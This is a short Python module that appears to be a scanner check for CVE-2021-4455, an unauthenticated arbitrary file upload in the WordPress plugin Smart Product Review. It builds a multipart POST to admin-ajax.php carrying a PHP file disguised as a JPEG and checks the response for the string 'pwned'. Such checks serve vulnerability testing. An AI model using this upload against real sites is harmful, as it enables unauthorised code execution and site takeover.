"""
Smart Product Review <= 1.0.4 (CVE-2021-4455) - Arbitrary File Upload
Description: Missing file-type validation allows unauthenticated upload
Severity: High
CVSS Score: 7.5
Affected Versions: Smart Product Review <= 1.0.4
Reference: https://www.exploit-db.com/exploits/50533
"""

def get_payload():
    return {
        'path': '/wp-admin/admin-ajax.php',
        'method': 'POST',
        'headers': {
            'Content-Type': 'multipart/form-data'
        },
        'files': {
            'file': ('test.php', '<?php echo "pwned"; ?>', 'image/jpeg')
        },
        'data': {
            'action': 'smart_product_review_upload'
        }
    }

def check_response(response):
    return response.status_code == 200 and 'pwned' in response.text 